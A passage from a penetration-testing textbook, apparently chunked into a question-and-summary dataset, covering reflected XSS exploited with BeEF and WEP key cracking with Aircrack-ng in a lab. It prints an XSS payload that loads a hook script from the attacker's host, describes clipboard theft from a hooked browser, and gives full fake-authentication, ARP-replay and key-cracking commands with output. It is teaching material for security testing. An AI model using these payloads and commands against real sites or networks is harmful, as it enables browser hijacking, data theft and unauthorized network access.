we\ncan use the dir command to find interesting files, or the command netsh\nadvfirewall firewall show rule name=all to see the rules in the Windows\nfirewall. Since we are on a Windows system we cannot use wget from the com-\nmand line to pull down an interactive shell, but we can use various other\nmethods to do so. In Chapter 8 we used TFTP to transfer a shell from our\nKali system to the Windows XP target. Windows 7 does not have a TFTP\nclient installed by default, but in Windows 7 we do have a powerful scripting\nlanguage called Powershell, which we can use for tasks such as downloading\nand executing a file. note A study of Powershell is outside of the scope of this book, but it is very helpful for post\nexploitation on the latest Windows operating systems. A good reference can be found\nhere: http://www.darkoperator.com/powershellbasics/. Cross-site scripting\nPerhaps the most common and most debated web application security vul-\nnerability is cross-site scripting (XSS). When such vulnerabilities are pres-\nent, attackers can inject malicious scripts into an otherwise innocuous site\nto be executed in the user’s browser. XSS attacks are typically broken into two categories: stored and reflected. Stored XSS attacks are stored on the server and executed whenever a user visits\nthe page where the script is stored. User forums, reviews, and other places\nwhere users can save input displayed to other users are ideal places for these\nsorts of attacks. Reflective XSS attacks are not stored on the server but are cre-\nated by sending requests with the XSS attack itself. The attacks occur when\nuser input is included in the server’s response, for example, in error messages\nor search results. Reflected XSS attacks rely on a user sending a request with the XSS\nattack included, so there will likely be some sort of social-engineering com-\nponent to the attack as well. In fact, having XSS might actually increase the\nsuccess of a social-engineering attack, because you can craft a URL that is\npart of a real website—a website the user knows and trusts—and use the\nXSS to, for instance, redirect the user to a malicious page. Like the other\nattacks discussed in this chapter, XSS attacks rely on a lack of user input\nsanitation, which allows us to create and run a malicious script. Web Application Testing 329\nChecking for a Reflected XSS Vulnerability\nWe should check any user input for XSS vulnerabilities. We’ll find that our\napplication has a reflected XSS vulnerability in the search functionality. Try\nsearching for the title xss in the Books Search box, as shown in Figure 14-20. As shown in Figure 14-21, the search results page prints the original\nuser input as part of the results. If the user input is not properly sanitized,\nthis may be where we can use XSS. Figure 14-20: Search Figure 14-21: Search results page\nfunction\nThe typical first XSS test to try to run is a JavaScript alert box. The\nfollowing code will attempt to put up a JavaScript alert with the text xss. If\nuser input is not properly filtered, the script will be executed as part of the\nsearch results page. <script>alert('xss');</script>\nIn some cases, the user’s browser will auto-\nmatically block obvious XSS attacks such as this\none, and Iceweasel is one such browser. Switch over\nto your Windows 7 target with Internet Explorer. As shown in Figure 14-22, the pop-up alert script\nexecutes. Having determined that reflective XSS is\npresent, we could try to leverage it to attack users. Common attacks include stealing session cookies Figure 14-22: XSS\nto send to an attacker-controlled site or embed- pop-up\nding a frame (a way of splitting an HTML page\ninto different segments) to prompt the user for\nlogin credentials. A user may think that the frame\nis part of the original page and enter his or her cre-\ndentials, which are then sent offsite to the attacker. 330 Chapter 14\nLeveraging XSS with the Browser Exploitation Framework\nXSS issues tend to be overlooked. How much damage can an alert box that\nsays “XSS” do anyway? A good tool for leveraging XSS issues and uncovering\ntheir true attack potential is the Browser Exploitation Framework (BeEF). Using BeEF, we can “hook” a browser by tricking the user into browsing to\nour BeEF server, or better yet using the BeEF JavaScript hook as a payload\nin the presence of an XSS vulnerability like the one discussed previously. Now change directories to /usr/share/beef-xss, and run ./beef, as shown\nin Listing 14-3. This will start the BeEF server, including the web interface\nand the attack hook. root@kali:~# cd /usr/share/beef-xss/\nroot@kali:/usr/share/beef-xss# ./beef\n[11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000]. [11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha\n--snip--\n[11:53:27][+] running on network interface: 192.168.20.9\n[11:53:27] | Hook URL: http://192.168.20.9:3000/hook.js\n[11:53:27] |_ UI URL: http://192.168.20.9:3000/ui/panel\n[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf\n[11:53:27][*] HTTP Proxy: http://127.0.0.1:6789\n[11:53:27][*] BeEF server started (press control+c to stop)\nListing 14-3: Starting BeEF\nNow in Kali, browse to http://192.168.20.9:3000/ui/panel to access the\nBeEF web interface. You should be presented with a login page, like the one\nshown in Figure 14-23. Figure 14-23: BeEF login page\nWeb Application Testing 331\nThe default credentials for BeEF are beef:beef. After you enter them in\nthe login dialog, you are shown the web interface (Figure 14-24). Figure 14-24: BeEF web interface\nCurrently no browsers are hooked in BeEF, so we need to trick some-\none into loading and running BeEF’s malicious hook.js script. Let’s return to\nour XSS vulnerability in the Book Search box. This time, instead of using\nan alert dialog, let’s leverage the issue to load BeEF’s hook.js in the target\nbrowser. From the Windows 7 Internet Explorer browser, enter \"<script\nsrc=http://192.168.20.9:3000/hook.js></script>\" into the Book Search box,\nand click Go. This time there will be no alert box or other indication to\nthe user suggesting that anything is amiss, but if you turn back to BeEF, you\nshould see the IP address of the Windows 7 box in the Online Browsers list\nat the left of the screen, as shown in Figure 14-25. In the details pane, with the IP address of Windows 7 selected in BeEF,\nyou can see details about the hooked browser as well as the underlying\nsystem, such as versions and installed software. At the top of the pane are\nadditional tabs, such as Logs and Commands. Click Commands to see addi-\ntional BeEF modules you can run against the hooked browser. 332 Chapter 14\nFigure 14-25: A hooked browser\nFor example, as shown in Figure 14-26, navigate to Browser4Hooked\nDomain4Create Alert Dialog. At the right of the screen, you have the option\nto change the alert text. When you finish, click Execute at the bottom right. Figure 14-26: Running a BeEF module\nWeb Application Testing 333\nTurn back to your Windows 7 browser. You should see the pop-up\ndialog, shown in Figure 14-27. Figure 14-27: Causing an alert in the hooked browser\nAnother interesting BeEF command allows you to steal data from the\nWindows clipboard. On the Windows 7 system, copy some text to the clip-\nboard. Now in BeEF, navigate in the Commands Module Tree to Host4Get\nClipboard. The text on the clipboard is displayed in the Command Results\nPane on the right, as shown in Figure 14-28. Figure 14-28: Stealing clipboard information\nIn this section we have looked at only two simple examples of lever-\naging a hooked browser with BeEF. There is plenty more we can do. For\nexample, we can use the target browser as a pivot to start gathering infor-\nmation about the local network with ping sweeps or even port scans. You\n334 Chapter 14\ncan even integrate BeEF with Metasploit. On your pentests, you can use\nBeEF as part of social-engineering attacks.\n\nIf you can find an XSS in your\nclient’s web server, you can improve the results of your campaign by direct-\ning users not to a attacker-owned site but rather to the company website\nthey trust. Cross-site request Forgery\nCross-site scripting exploits the trust a user has in a website, whereas a simi-\nlar vulnerability class called cross-site request forgery (CSRF) exploits a website’s\ntrust in the user’s browser. Consider this scenario: A user is logged in to\na banking website and has an active session cookie. Naturally, the user is\nalso browsing to other websites in other tabs. The user opens a malicious\nwebsite that contains a frame or image tag that triggers a HTTP request\nto the banking website with the correct parameters to transfer funds to\nanother account (presumably the attacker’s account). The banking website,\nof course, checks to see that the user is logged in. Finding that the user’s\nbrowser has a currently active session, the banking website executes the\ncommand in the request, and the attacker steals the user’s money. The user,\nof course, never initiated the transaction—he just had the misfortune of\nbrowsing to a malicious website. web application scanning with w3af\nIt is difficult to automate testing with a tool, particularly for custom appli-\ncations. Nothing compares to a skilled web application tester with a proxy. That said, several commercial web application scanners and some free and\nopen source scanners can automate tasks such as crawling the website and\nsearching for known security issues. One open source web application scanner is the Web Application Attack\nand Audit Framework (w3af). w3af is made up of plugins that perform differ-\nent web application–testing tasks, such as looking for URLs and parameters\nto test and testing interesting parameters for SQL injection vulnerabilities. Now start w3af, as shown here. root@kali:~# w3af\nThe w3af GUI will be launched and should look similar to Figure 14-29. On the left of the screen are the scan configuration profiles. By default\nyou are in an empty profile, which allows you to fully customize which w3af\nplugins are run against your target. You can also use several preconfig-\nured profiles. For example, the OWASP_Top10 profile will crawl the app\nwith plugins from the discovery section as well as run plugins from the\naudit section that look for vulnerabilities from the Open Web Application\nSecurity Project (OWASP)’s top ten vulnerability categories. Enter the URL\nto be scanned, as shown in Figure 14-29, and click Start at the right of the\nwindow. Web Application Testing 335\nFigure 14-29: Using w3af\nAs the scan runs, details will be shown in the Logs tab, and issues dis-\ncovered will be added to the Results tab (Figure 14-30). Figure 14-30: w3af results\n336 Chapter 14\nw3af finds the SQL injection vulnerability that we exploited at the start\nof this chapter as well as some minor issues that are worth adding to your\npentest report. You can try other w3af profiles or create your own, custom-\nizing which plugins are run against the app. w3af can even do a creden-\ntialed scan, in which it has an active logged-in session with the app, giving\nit access to additional functionality to search for issues. summary\nIn this chapter we took a brief look at examples of common web application\nvulnerabilities in a sample application built without the input sanitation\nneeded to mitigate many attacks. Our bookservice app has a SQL injection\nvulnerability in its books details page. We were able to extract data from the\ndatabase and even get a system command shell. We found a similar injection vulnerability in the XML-based login\nfunctionality. We were able to use a crafted query to bypass authentica-\ntion and log in as the first user stored in the AuthInfo.xml file. We were also\nable to use the newsletter page to see the source of arbitrary pages in the\nweb application including the authentication information—the result of a\nlack of access control on the pages as well as a local file inclusion issue. We\nwere able to run commands on the system by chaining them with the email\naddress to sign up for newsletters, and we were able to write the output of\ncommands to a file and then access them through the browser. We found\nan example of reflective XSS in the search functionality. We used BeEF\nto leverage this XSS issue and gain control of a target browser, giving us a\nfoothold in the system. Finally, we looked briefly at an open source web vul-\nnerability scanner, w3af. Web application testing deserves much more discussion than we can\ndevote to it in this book. All the issues covered in this chapter are discussed\nin detail on OWASP’s website https://www.owasp.org/index.php/Main_Page/,\nwhich is a good starting point for continuing your study of web application\nsecurity. OWASP also publishes a vulnerable app, Webgoat, which uses exer-\ncises to give users hands-on experience exploiting web application issues\nlike the ones in this chapter, as well as others. Working through Webgoat is\na great next step if you want to learn more about testing web apps. Another thing to note is that our application is an ASP.net application\nrunning on Windows. In your pentesting career, you will encounter other\nkinds of applications, such as Apache/PHP/MySQL applications running\non Linux, or a Java web application. You may also find yourself testing appli-\ncations that use APIs such as REST and SOAP to transfer data. Though the\nunderlying issues caused by lack of input sanitation can occur on any plat-\nform, the particular coding mistakes and the syntax to exploit them may\nvary. Be sure to become familiar with different kinds of applications as you\ncontinue to study web application security. Web Application Testing 337\n15\nwireless at taCks\nIn this chapter we’ll take a brief look at wireless secu-\nrity. So far we’ve looked at several ways to breach\nthe security perimeter. But web application security,\nfirewalls, security-awareness training, and so on can\ndo nothing to protect an internal network if there’s\nan attacker sitting on a bench in front of the target\norganization’s building and the organization provides\nwireless access with weak encryption to the internal\nnetwork. setting up\nFor the examples in this chapter, I’ll be using a Linksys WRT54G2 wire-\nless router, but any router that supports WEP and WPA2 encryption will\nwork. By default, my Linksys router has a web administration interface at\nhttp://192.168.20.1, as shown in Figure 15-1. The default username and\npassword for the router is admin:admin. The default credentials vary from\ndevice to device, but it’s common on penetration tests to find routing\nequipment that still uses the default credentials—a failing that could allow\nattackers to gain administrative control over the routers. note We won’t cover attacking networking devices in this book, but take a look at the\nadministrative interfaces on any networking equipment you have. Attacker access to\nenterprise network devices can do significant damage and should not be overlooked. Figure 15-1: Linksys WRT54G2 web interface\nI’ll also be using an Alfa Networks AWUS036H USB wireless card. This\ncard, and similar Alfa USB models, are ideal for wireless security assessments,\nparticularly when working with virtual machines. VMware doesn’t have driv-\ners for wireless cards, but it is capable of USB passthrough, allowing us to use\nthe wireless drivers built into Kali Linux from a virtual machine. The use of\na USB wireless card will allow us to assess wireless networks from our virtual\nmachine. Viewing Available Wireless Interfaces\nAfter attaching the Alfa wireless card to the Kali virtual machine, enter\niwconfig to see the wireless interfaces available on your virtual machine. Note in my case that the Alfa card is attached as wlan0 u, as shown in\nListing 15-1. root@kali:~# iwconfig\nwlan0u IEEE 802.11bg ESSID:off/any\nMode:Managed Access Point: Not-Associated Tx-Power=20 dBm\n340 Chapter 15\nRetry long limit:7 RTS thr:off Fragment thr:off\nEncryption key:off\nPower Management:off\nlo no wireless extensions. eth0 no wireless extensions. Listing 15-1: Kali Linux wireless interfaces\nScan for Access Points\nNow we can scan for nearby access points. The command iwlist wlan0 scan\nwill scan for nearby access points using the wlan0 interface, as shown in\nListing 15-2. root@kali:~# iwlist wlan0 scan\nCell 02 - Address: 00:23:69:F5:B4:2Bu\nChannel:6v\nFrequency:2.437 GHz (Channel 6)\nQuality=47/70 Signal level=-63 dBm\nEncryption key:offw\nESSID:\"linksys\"x\nBit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s\n9 Mb/s; 14 Mb/s; 18 Mb/s\nBit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s\nMode:Master\n--snip--\nListing 15-2: Scanning for nearby wireless access points\nFrom this initial scan we gather almost all the information we’ll need\nin order to attack the base station, as you’ll see later in the chapter. We have\nits MAC address u, the channel it’s broadcasting on v, we learn that it’s not\nusing encryption at this time w, and we have its SSID x. monitor mode\nBefore proceeding, let’s put our Alfa card into monitor mode. Much like\npromiscuous mode in Wireshark, monitor mode allows us to see additional\nwireless traffic on top of the traffic intended for our wireless card. We’ll\nuse the Airmon-ng script, part of the Aircrack-ng wireless assessment suite,\nto put the Alfa card into monitor mode. First, make sure that no running\nprocesses will interfere with monitor mode by entering airmon-ng check, as\nshown in Listing 15-3. root@kali:~# airmon-ng check\nFound 2 processes that could cause trouble. If airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them! -e\nWireless Attacks 341\nPID Name\n2714 NetworkManager\n5664 wpa_supplicant\nListing 15-3: Checking for interfering processes\nAs you can see, Airmon found two running processes that could inter-\nfere. Depending on your wireless card and its drivers, you may or may not\nrun into any trouble if you don’t kill off these programs. The card we’re\nusing shouldn’t have trouble, but some USB wireless cards do. To kill all\ninterfering processes in one step, enter airmon-ng check kill, as shown in\nListing 15-4. root@kali:~# airmon-ng check kill\nFound 2 processes that could cause trouble. If airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them! -e\nPID Name\n2714 NetworkManager\n5664 wpa_supplicant\nKilling all those processes... Listing 15-4: Killing interfering processes\nNow enter airmon-ng start wlan0 to switch the wireless interface into\nmonitor mode, as shown in Listing 15-5. This will allow us to capture pack-\nets not intended for us. Airmon-ng creates the wireless interface mon0 u. root@kali:~# airmon-ng start wlan0\nInterface Chipset Driver\nwlan0 Realtek RTL8187L rtl8187 - [phy0]\n(monitor mode enabled on mon0) u\nListing 15-5: Putting the Alfa card in monitor mode\nCapturing Packets\nWith our interface in monitor mode, let’s see what data we can gather using\nAirodump-ng from the Aircrack-ng suite. Airodump-ng is used to capture\nand save wireless packets. Listing 15-6 shows how we tell Airodump-ng to\nuse the wireless interface in monitor mode mon0. root@kali:~# airodump-ng mon0 --channel 6\nCH 6 ][ Elapsed: 28 s ][ 2015-05-19 20:08\nBSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID\n00:23:69:F5:B4:2Bu -30 53 2 0 6 54 . OPNv linksysw\n342 Chapter 15\nBSSID STATION PWR Rate Lost Frames Probe\n00:23:69:F5:B4:2B 70:56:81:B2:F0:53x -21 0 -54 42 19\nListing 15-6: Starting a packet dump with Airodump-ng\nThe Airodump-ng output gathers information about the wireless packets,\nincluding the base service set identification (BSSID), which is the base sta-\ntion’s MAC address u. We also see additional information such as the encryp-\ntion algorithm used for wireless security v and the Service Set Identification\n(SSID) w.",
    "question": "What are the common web application vulnerabilities discussed in the text and how can they be exploited using tools like Burp Proxy, SQLMap, and BeEF?",
    "summary": "This chapter discusses common web application vulnerabilities, including SQL injection, XPath injection, local file inclusion, and cross-site scripting (XSS). It explains how to use tools like Burp Proxy and BeEF to exploit these vulnerabilities and gain access to sensitive data or system commands. It also covers the use of w3af, an open-source web application scanner, to identify and report security issues. Finally, it briefly touches on wireless security, explaining how to set up a wireless interface in monitor mode and use tools like Airodump-ng to capture and analyze wireless traffic."
  },
  {
    "start": 97,
    "end": 105,
    "text": "Airodump-ng also picks up the MAC addresses of connected\nclients x and the MAC address of my host machine attached to the wireless\naccess point. (We’ll examine the other fields in the Airodump-ng output as\nwe move through cracking wireless security later in the chapter.)\nNow we know the Linksys access point is open, with no security. open wireless\nOpen wireless networks are a real disaster from a security perspective\nbecause anyone within antenna range of the access point can connect to\nthat network. While open networks could require authentication after con-\nnection, and some do, many just let anyone connect. Also, the wireless packets traveling through an open network are not\nencrypted, and anyone listening can see any data in plaintext. Sensitive\ndata may be secured by protocols like SSL, but that’s not always the case. For instance, FTP traffic on an open wireless network is completely unen-\ncrypted, including login information, and we don’t even need to use ARP\nor DNS cache poisoning to capture the packets. Any wireless card in moni-\ntor mode will be able to see the unencrypted traffic. Now let’s look at attacking networks that deploy various security protocols\nthat keep unwanted entities from connecting to the network and intercept-\ning traffic. wired equivalent Privacy\nMany routers that come with encryption enabled use older encryption\ncalled wired equivalent privacy (WEP) by default. The fundamental problem\nwith WEP is that flaws in its algorithm make it possible for an attacker to\nrecover any WEP key. WEP uses the Rivest Cipher 4 (RC4) stream cipher\nand a pre-shared key. Anyone who wants to connect to the network can use\nthe same key, made up of a string of hexadecimal digits, for both encryp-\ntion and decryption. The plaintext (unencrypted) data undergoes an exclu-\nsive or (XOR) bitwise operation with the keystream to create encrypted\nciphertext. Wireless Attacks 343\nThe bitwise XOR operation has four possibilities:\n• 0 XOR 0 = 0\n• 1 XOR 0 = 1\n• 0 XOR 1 = 1\n• 1 XOR 1 = 0\nThe zeros and ones in the bitstream in Figures 15-2 and 15-3 can represent\nany data being sent over the network. Figure 15-2 shows how the plaintext is\nXORed with the keystream to create the ciphertext. Plaintext: 101101100000111100101010001000... Keystream: 110001101011100100011100110100... Ciphertext: 011100001011011100100110001100... Figure 15-2: WEP encryption\nWhen decrypted, the same keystream is XORed against the ciphertext\nto restore the original plaintext, as shown in Figure 15-3. Ciphertext: 011100001011011100100110001100... Keystream: 110001101011100100011100110100... Plaintext: 101101100000111100101010001000... Figure 15-3: WEP decryption\nThe shared WEP key can be either 64 or 148 bits. In either case, an\ninitialization vector (IV) makes up the first 24 bits of the key to add ran-\ndomness, making the effective key length really only 40 or 104 bits. Adding\nrandomness with an IV is common in cryptographic systems because if the\nsame key is used repeatedly, attackers can examine the resulting ciphertext\nfor patterns and potentially break the encryption. 344 Chapter 15\nnote Cryptanalysts often find that randomness is not correctly implemented in crypto-\ngraphic algorithms, as is the case with WEP. For starters, WEP’s 24 bits of random-\nization is minimal by modern cryptographic standards. The IV and key are concatenated, then run through a key-scheduling\nalgorithm (KSA) and a pseudorandom number generator (PRNG) to cre-\nate the keystream. (I’ll skip the math here.) Next, an integrity check value\n(ICV) is computed and concatenated with the plaintext before encryption\nin order to prevent attackers from intercepting the ciphertexts, flipping\nsome bits, and changing the resulting decrypted plaintext to something\nmalicious or, at least, misleading. The plaintext is then XORed with the key-\nstream (as shown in Figure 15-2). The resulting packet is made up of the IV,\nthe ICV, the ciphertext, and a two-bit key ID, as shown in Figure 15-4.\n\nIV IV\n\nKSA PRNG\nkey ID\nkey\nmessage ciphertext\n\nICV ICV\nFigure 15-4: WEP encryption\nDecryption is similar, as shown in Figure 15-5. The IV and key (denoted\nby the key ID), stored in plaintext as part of the packet, are concatenated\nand run through the same key-scheduling algorithm and pseudorandom\nnumber generators to create a keystream identical to the one used for\nencryption. The ciphertext is then XORed with the keystream to reveal\nthe plaintext and the ICV. Finally, the decrypted ICV is compared with the\nplaintext ICV value appended to the packet. If the values don’t match, the\npacket is thrown out.\nWireless Attacks 345\nIV\n\nKSA PRNG\nkey ID key\nciphertext message\n\nICV ICV\nFigure 15-5: WEP decryption\nWEP Weaknesses\nUnfortunately, WEP has some inherent problems that allow an attacker to\nrecover a key or alter legitimate packets. In fact, every WEP key is recover-\nable by an attacker armed with enough ciphertexts encrypted with the same\nshared key. The only cryptosystem that is truly secure is a random one-time\npad, which uses a specific key only once. The main trouble with WEP is that\nthe 24-bit IV doesn’t introduce enough randomness; it has at most 224 (that\nis, 16,777,216) values. There is no standard way for wireless cards and access points to com-\npute IVs, and in practice, the IV space used may be even smaller. Either way,\ngiven enough packets, IVs will be reused, and the same value (static key\nconcatenated with the IV) will be used to generate the ciphertext. By pas-\nsively listening for traffic (or better yet, injecting traffic into the network to\nforce more packets and, thus, more IVs to be generated), an attacker can\ngather enough packets to perform cryptanalysis and recover the key. Similarly, the ICV that attempts to keep attackers from intercepting the\nencrypted message, flipping bits, and changing the resulting plaintext is\ninsufficient. Unfortunately, weaknesses in the ICV implementation Cyclic\nRedundancy Check 32 (CRC-32) may allow attackers to craft the correct\nICV for a modified message. Because CRC-32 is a linear algorithm, flipping\na specific bit in the ciphertext has a deterministic result on the resulting\nICV, and an attacker with knowledge of how CRC-32 is calculated could\ncause a modified message to be accepted. Thus, the ICV implementation,\nlike the IV, is not considered sound by modern cryptographic standards. We can use the Aircrack-ng suite to recover the shared key from a wire-\nless network secured with WEP. Again, the math behind the cryptographic\nattacks is beyond the scope of this book. Luckily, we have tools that will take\ncare of the hard stuff if we can capture the required traffic. 346 Chapter 15\nCracking WEP Keys with Aircrack-ng\nThere are multiple ways to crack WEP keys, including the fake authentica-\ntion attack, fragmentation attack, chopchop attack, caffé latte attack, and\nPTW attack. We’ll take a closer look at the fake authentication attack, which\nrequires at least one legitimate client connected to the access point. We’ll use the host system to simulate an attached client. First, change\nthe wireless security on your router to WEP (see your user guide if you need\nhelp), and then make sure your wireless card is in monitor mode so that you\ncan capture traffic from the network without first authenticating. Now to see what data we can collect using the Airodump-ng tool from\nAircrack-ng. Tell Airodump-ng to use the wireless interface in monitor mode\nmon0, as shown in Listing 15-7, and use the -w flag to save all packets to a file. root@kali:~# airodump-ng -w book mon0 --channel 6\nCH 6 ][ Elapsed: 20 s ][ 2015-03-06 19:08\nBSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID\n00:23:69:F5:B4:2Bu -53 22 6 0 6v 54 . WEPw WEP linksysx\nBSSID STATION PWR Rate Lost Frames Probe\n00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -26 54-54 0 6\nListing 15-7: Airodump-ng capture for WEP cryptanalysis\nThis initial scan gathers all the information we need to begin a WEP\nattack against the base station. Here we have the BSSID u, wireless chan-\nnel v, encryption algorithm w, and the SSID x. We’ll use this information\nto gather the packets to crack the WEP key. Your own setup’s information is\nlikely different, of course, but here’s what we’ll work with:\n• Base Station MAC Address: 00:23:69:F5:B4:2B\n• SSID: linksys\n• Channel: 6\nInjecting Packets\nAlthough the Airodump-ng output in Listing 15-7 shows some traffic from\nthe access point, to crack a 64-bit WEP key, we need about 250,000 IVs, and\nfor a 148-bit WEP key, about 1,500,000. Rather than idly listen for packets,\nwe’ll capture and retransmit packets to the access point to generate unique\nIVs quickly. We need to authenticate, because if our MAC address isn’t\nauthenticated with the access point, any packets we send will be dropped,\nand we’ll receive a deauthentication request. We’ll use Aireplay-ng to fake\nauthentication with the access point and trick it into responding to our\ninjected packets. When using fake authentication, we tell the access point we’re ready to\nprove we know the WEP key, as shown in Listing 15-8. Of course, because\nwe don’t know the key yet, we don’t send it, but our MAC address is now on\nthe list of clients that can send packets to the access point, hence the fake\nauthentication. Wireless Attacks 347\nroot@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0\n20:02:56 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6\n20:02:56 Sending Authentication Request (Open System) [ACK]\n20:02:56 Authentication successful\n20:02:56 Sending Association Request [ACK]\n20:02:56 Association successful :-) (AID: 1) u\nListing 15-8: Fake authentication with Aireplay-ng\nWe fake authentication using the following flags with their associated data:\n• -1 tells Aireplay-ng to fake authentication. • 0 is the retransmission time. • -e is the SSID; in my case linksys. • -a is the MAC address of the access point we want to authenticate with. • -h is the MAC address of our card (which should be on a sticker on the\ndevice). • mon0 is the interface to use for the fake authentication. After sending the Aireplay-ng request, you should receive a smiley face\nand indication that authentication was successful u. Generating IVs with the aRP Request Relay attack\nWith the base station willing to accept packets from us, we can capture\nand rebroadcast legitimate packets. While the access point won’t allow us\nto send traffic without first sending the WEP key to authenticate, we can\nrebroadcast traffic from properly authenticated clients. We’ll use the attack technique known as ARP Request Replay to gener-\nate IVs quickly by having Aireplay-ng listen for an ARP request and then\nretransmit it back to the base station. (When the access point receives an\nARP request, it rebroadcasts it with a new IV.) Aireplay-ng will rebroadcast\nthe same ARP packet repeatedly, and each time it’s broadcast, it will have a\nnew IV. Listing 15-9 shows the attack in action. Aireplay-ng reads packets look-\ning for an ARP request. You won’t see any data until Aireplay-ng sees an\nARP request it can rebroadcast. We will see that next. root@kali:~# aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0\n20:14:21 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6\nSaving ARP requests in replay_arp-1142-201521.cap\nYou should also start airodump-ng to capture replies. Read 541 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)\nListing 15-9: Rebroadcasting ARP packets with Aireplay-ng\n348 Chapter 15\nWe use these options:\n• -3 performs the ARP request replay attack. • -b is the base station MAC address. • -h is our Alfa card MAC address. • mon0 is the interface. Generating an aRP Request\nUnfortunately, as you can see in Listing 15-9, we don’t see any ARP requests. To generate an ARP request, we’ll use the host system as a simulated client\nby pinging an IP address on the network from the connected host system. Aireplay-ng will see the ARP request and retransmit it to the access point\nover and over. As you can see in the Airodump-ng screen, shown in Listing 15-10, the\n#Data u number, indicating captured IVs, increases rapidly as Aireplay-ng\ncontinues to retransmit the ARP packet, causing the access point to gener-\nate more IVs. (If your aireplay-ng -3 says \"Got adeauth/disassoc\" or something\nsimilar and your #Data number is not quickly rising, run the fake association\ncommand from Listing 15-8 again to reassociate with the access point. Your\n#Data field should again start rising rapidly.)\nCH 6 ][ Elapsed: 14 mins ][ 2015-11-22 20:31\nBSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID\n00:23:69:F5:B4:2B -63 92 5740 85143u 389 6 54 . WEP WEP OPN linksys\nListing 15-10: IVs being captured in Airodump-ng\nCracking the Key\nRemember, we need about 250,000 IVs to crack a 64-bit WEP key. As long\nas you remain associated with the base station, as shown in Listing 15-8,\n(rerunning the command if it becomes necessary) and have generated an\nARP request on the network, it should only take a few minutes to collect\nenough IVs. Once we’ve gathered enough IVs, we can use Aircrack-ng to do\nthe math to turn the collected IVs into the correct WEP key. Listing 15-11\nshows how we crack the key by using the -b flag and providing the filename\nwe used in Airodump-ng followed by *.cap u. This tells Aircrack-ng to read\nfrom all .cap files saved by Airodump-ng. root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.capu\nOpening book-01.cap\nAttack will be restarted every 5000 captured ivs. Starting PTW attack with 239400 ivs. KEY FOUND! [ 2C:85:8B:B6:31 ] v\nDecrypted correctly: 100%\nListing 15-11: Recovering the WEP key with Aircrack-ng\nWireless Attacks 349\nAfter a few seconds of analysis Aircrack-ng returns the correct key v. We can now authenticate with the network. If this were a pentest client’s\nnetwork, we could now directly attack any systems on the network. Challenges with WEP Cracking\nAs with many topics discussed in this book, information about wireless\nattacks could fill a book, and I’ve shown you only one attack. One thing\nto keep in mind when attacking WEP is that clients may use filters in an\nattempt to thwart attacks like this. For example, access points could use\nMAC filtering to allow only wireless cards with certain MAC addresses to\nconnect, and if your Alfa card isn’t on the list, your fake authentication\nattempt will fail. To bypass MAC filtering, you could use a tool like MAC\nChanger in Kali to spoof a MAC address and create an accepted value. Keep in mind that WEP keys are always crackable if we can gather enough\npackets, and for security reasons, WEP encryption should not be used in\nproduction. It’s worth noting that the Wifite tool, installed by default in Kali Linux,\nbehaves as a wrapper around the Aircrack-ng suite and will automate the\nprocess of attacking wireless networks, including cracking WEP. But while\nyou are learning how Wi-Fi attacks work, it is better to walk through the\nprocess step by step instead of using an automation wrapper. We now turn our attention to the stronger wireless encryption proto-\ncols, WPA and WPA2. wi-Fi Protected access\nAs weaknesses in WEP came to light, a more robust wireless security system\nwas needed and a new system (which ultimately became WPA2) was built\nto replace WEP. However, the creation of a secure cryptographic system for\nwireless took time, and in the meantime, additional security was needed\nthat was compatible with deployed wireless hardware.\n\nThus, Wi-Fi Protected\nAccess (WPA), also known as Temporal Key Integrity Protocol (TKIP), was born. WPA uses the same underlying algorithm as WEP (RC4) but seeks to\naddress WEP’s weaknesses by adding keystream randomness to IVs and\nintegrity to ICV. Unlike WEP, which uses a 40- or 104-bit key combined with\nweak IVs for each packet, WPA generates a 148-bit key for each packet to\nensure that each packet is encrypted with a unique keystream. Additionally, WPA replaces WEP’s weak CRC-32 message integrity check\nwith a message authentication code (MAC) algorithm called Michael, to pre-\nvent attackers from easily calculating the resulting changes to the ICV when\na bit is flipped. Though both WPA and even WPA2 have their weaknesses,\nthe most common vulnerability (which we’ll exploit later in this chapter)\nis the use of weak passphrases. 350 Chapter 15\nwPa2\nWPA2 was built from the ground up to provide a secure encryption system\nfor wireless networks. It implements an encryption protocol built specifi-\ncally for wireless security called Counter Mode with Cipher Block Chaining\nMessage Authentication Code Protocol (CCMP). CCMP is built on the Advanced\nEncryption Standard (AES). WPA and WPA2 support both personal and enterprise setups. WPA/\nWPA2 personal uses a pre-shared key, similar to WEP. WPA/WPA2 enter-\nprise adds an additional element called a Remote Authentication Dial-In User\nService (RADIUS) server to manage client authentication. The Enterprise Connection Process\nIn WPA/WPA2 enterprise networks, the client connection process com-\nprises four steps, as shown in Figure 15-6. First the client and the access\npoint agree on mutually supported security protocols. Then, based on the\nauthentication protocol chosen, the access point and the RADIUS server\nexchange messages to generate a master key. Once a master key is gener-\nated, a message that authentication was successful is sent to the access point\nand passed on to the client, and the master key is sent to the access point. The access point and the client exchange and verify keys for mutual authen-\ntication, message encryption, and message integrity via a four-way hand-\nshake, as discussed in “The Four-Way Handshake” on this page. Following\nkey exchange, traffic between the client and the access point is secured with\nWPA or WPA2. protocol agreement\nauthentication\nkey distribution\naccess point\nmaster key distribution\nencryption\nclient RADIUS server\nFigure 15-6: WPA/WPA2 enterprise connection\nThe Personal Connection Process\nThe WPA/WPA2 personal connection process is slightly simpler than the\nenterprise one: No RADIUS server is required, and the entire process is\nbetween the 